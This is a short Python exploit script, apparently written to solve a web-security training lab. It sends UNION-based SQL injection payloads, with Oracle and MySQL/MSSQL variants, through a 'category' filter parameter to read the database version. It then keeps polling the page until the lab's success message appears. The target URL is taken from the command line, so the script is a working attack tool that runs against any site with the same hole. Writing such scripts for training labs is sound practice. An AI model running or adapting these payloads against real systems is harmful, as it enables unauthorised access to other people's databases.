import sys
import argparse
import time
import logging
import urllib3

import requests


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.setrecursionlimit(50) # for the probing

PROXIES = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

HEADERS = {
    "X-Pwnfox-Color":"orange"
}

SQLI_PAYLOAD_ORACLE = "' UNION Select NULL,banner from v$version -- "
SQLI_PAYLOAD_MMSQL = "' UNION Select NULL,@@version -- "

logger = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S"
)


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n","--no-proxy",help="to not use the defined proxy",default=False,action="store_true")
    parser.add_argument("-m","--my-mssql", help="to use payload for mysql/mssql",default=False,action="store_true")
    parser.add_argument("url", help="vulnerable resource link")
    return parser.parse_args()



def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
    return url

def exploit(url: str, no_proxy: bool,dbms: bool):

    if dbms:
        SQLI_PAYLOAD = SQLI_PAYLOAD_MMSQL
    else:
        SQLI_PAYLOAD = SQLI_PAYLOAD_ORACLE

    injected_url = url + f"filter?category=blahlblah{SQLI_PAYLOAD}"

    def check_success(url,no_proxy):
        logger.info("probing to see if exploit worked...")
        time.sleep(2)

        if not no_proxy:
            r = requests.get(url,proxies=PROXIES,headers=HEADERS,verify=False)
        else:
            r = requests.get(url,headers=HEADERS)

        if "Congratulations, you solved the lab!" not in r.text:
            logger.info("probing again...")
            check_success(url,no_proxy)
        else:
            logger.info("✅ exploit successful!")

    logger.info("[+] sending PAYLOAD")
    if not no_proxy:
        requests.get(injected_url,proxies=PROXIES,headers=HEADERS,verify=False)
        check_success(url,no_proxy)
    else:
        requests.get(injected_url,headers=HEADERS)
        check_success(url,no_proxy)



if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy,args.my_mssql)
